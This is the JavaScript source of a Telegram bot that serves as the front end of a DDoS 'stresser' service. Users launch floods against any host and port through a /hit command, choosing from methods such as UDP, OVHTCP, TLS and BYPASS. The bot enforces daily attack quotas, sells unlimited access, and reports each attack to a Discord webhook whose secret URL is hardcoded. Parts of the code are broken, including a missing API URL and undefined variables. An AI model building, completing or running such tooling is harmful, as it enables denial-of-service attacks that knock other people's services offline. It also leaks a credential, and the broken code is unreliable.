const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const dotenv = require('dotenv');

dotenv.config();

console.log("the bot is started!")

const token = process.env.TELEGRAM_BOT_TOKEN;
const discordWebhookURL = 'https://discord.com/api/webhooks/1098865936343248916/duoU4BW5IbvI0oqjBreWGLm5CYcA7NLrOFVET_aqJ7zXyDyo-w7Pe98V302EMxnnhGK2';
const bot = new TelegramBot(token, { polling: true });

const methods = [
  'DNS',
  'HOLD',
  'NFO',
  'OVHTCP',
  'UDP',
  'SADP',
  'DVR',
  'DISCORD',
  'SSH',
  'BROWSER',
  'TLS',
  'BYPASS',
  'HTTP',
];

const userHits = new Map();
const maxHitsPerDay = 5;
const maxTime = 120; // Maximum allowed time in seconds
let hitInProgress = false;

function resetUserHits() {
  userHits.clear();
  setTimeout(resetUserHits, 24 * 60 * 60 * 1000); // Reset hits every 24 hours
}

async function sendToDiscord(content) {
  try {
    await axios.post(discordWebhookURL, { content });
  } catch (error) {
    console.error('Error sending message to Discord:', error.message);
  }
}


async function isUserInChannel(userId) {
  try {
    const chatMember = await bot.getChatMember(channelId, userId);
    return chatMember && (chatMember.status === 'member' || chatMember.status === 'administrator' || chatMember.status === 'creator');
  } catch (error) {
    return false;
  }
}

resetUserHits();

bot.onText(/\/start/, (msg) => {
  const helpMessage = `
The Telegram bot is online. Sustresser

Help with commands: /help
Start the bot: /start
  `;
  bot.sendMessage(msg.chat.id, helpMessage);
});

bot.onText(/\/help/, (msg) => {
  const helpMessage = `
Available commands:
/hit HOST PORT TIME METHOD - Send a hit
/methods - List available methods
/ongoing - Check if there is an ongoing hit
/remaining - How Many Attack You left That day
  `;
  bot.sendMessage(msg.chat.id, helpMessage);
});

bot.onText(/\/remaining/, (msg) => {
  const userId = msg.from.id;
  const hitCount = userHits.get(userId) || 0;
  const remainingHits = maxHitsPerDay - hitCount;
  bot.sendMessage(msg.chat.id, `You have ${remainingHits} hits remaining today.`);
});

bot.onText(/\/ongoing/, (msg) => {
  const ongoingMessage = hitInProgress
    ? 'There is an ongoing hit. Please wait.'
    : 'There is no ongoing hit.';
  bot.sendMessage(msg.chat.id, ongoingMessage);
});

bot.onText(/\/methods/, (msg) => {
  bot.sendMessage(msg.chat.id, `Available methods: ${methods.join(', ')}`);
});
bot.onText(/\/hit (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isInChannel = await isUserInChannel(userId);

  if (hitInProgress) {
    bot.sendMessage(chatId, 'There is already a hit in progress. Please wait.');
    return;
  }

  const hitCount = userHits.get(userId) || 0;
  if (hitCount >= maxHitsPerDay) {
    bot.sendMessage(chatId, 'You have reached the daily limit of 5 hits. For Unlimited Then massage @sushub2 ');
    return;
  }

  const params = match[1].split(' ');
  if (params.length !== 4) {
    bot.sendMessage(chatId, 'Incorrect parameters. Usage: /hit HOST PORT TIME METHOD');
    return;
  }

  const [host, port, time, method] = params;
  if (!methods.includes(method)) {
    bot.sendMessage(chatId, `Invalid method. Available methods: ${methods.join(', ')}`);
    return;
  }

  if (time > maxTime) {
    bot.sendMessage(chatId, `Invalid time. Maximum allowed time is ${maxTime} seconds.`);
    return;
  }

  userHits.set(userId, hitCount + 1);
  hitInProgress = true;

  try {
    const response = await axios.get(`&host=${host}&port=${port}&time=${time}&method=${method}`);
    bot.sendMessage(chatId, `?? The attack has been successfully launched Wait 40 sec then send another attack!: ${response.data.message}`);
    sendToDiscord(`[User: ${msg.from.username} (${msg.from.id})] Started a hit: ${host}:${port}, Time: ${time}s, Method: ${method}`)
  } catch (error) {
    bot.sendMessage(chatId, 'An error occurred while sending the hit.');
  } finally {
    hitInProgress = false;
  }

  bot.onText(/\/checkhost (.+)/, async (msg, match) => {
    const host = match[1];
    try {
      await axios.get(`http://${host}`);
      bot.sendMessage(msg.chat.id, `The host ${host} is online.`);
    } catch (error) {
      bot.sendMessage(msg.chat.id, `The host ${host} is offline or not reachable.`);
    }
  });

  bot.onText(/\/lookup (.+)/, async (msg, match) => {
    const domain = match[1];
    dns.lookup(domain, (error, address, family) => {
      if (error) {
        bot.sendMessage(msg.chat.id, `Error during DNS lookup: ${error.message}`);
      } else {
        bot.sendMessage(msg.chat.id, `DNS lookup for ${domain}:\nIP Address: ${address}\nFamily: IPv${family}`);
      }
    });
  });
});
